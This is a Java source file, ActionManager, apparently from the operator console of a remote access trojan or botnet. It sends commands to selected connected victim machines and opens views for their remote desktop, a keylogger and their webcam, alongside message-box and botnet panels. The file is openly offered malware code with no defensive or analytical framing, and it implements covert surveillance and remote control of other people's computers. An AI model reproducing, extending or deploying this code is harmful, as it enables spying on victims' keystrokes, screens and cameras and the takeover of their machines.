package me.sebsb.action;

import javax.swing.JList;

import me.sebsb.ConnectedClient;
import me.sebsb.gui.GuiBotnet;
import me.sebsb.gui.GuiMessageBox;
import me.sebsb.utils.NetUtils;

public class ActionManager {

	private static GuiMessageBox messageBox;
	private static GuiBotnet botnet;
	
	public static void sendAction(Action action, JList<ConnectedClient> list) {
		if (action == Action.MESSAGE_BOX) {
			if (messageBox == null) {
				messageBox = new GuiMessageBox(list);;
			}
			messageBox.setVisible(true);
			messageBox.toFront();
			return;
		}
		if (action == Action.BOTNET) {
			if (botnet == null) {
				botnet = new GuiBotnet();
			}
			botnet.setVisible(true);
			botnet.toFront();
			return;
		}
		if (action == Action.DESKTOP) {
			for (ConnectedClient cc : list.getSelectedValuesList()) {
				cc.openDesktopView();
			}
		}
		if (action == Action.KEYLOGGER) {
			for (ConnectedClient cc : list.getSelectedValuesList()) {
				cc.openKeyLogView();
			}
		}
		if (action == Action.WEBCAM) {
			for (ConnectedClient cc : list.getSelectedValuesList()) {
				cc.openWebcamView();
			}
		}
		for (ConnectedClient cc : list.getSelectedValuesList()) {
			NetUtils.sendMessage(action.getCommand(), cc.getPrintWriter());
		}
	}
}
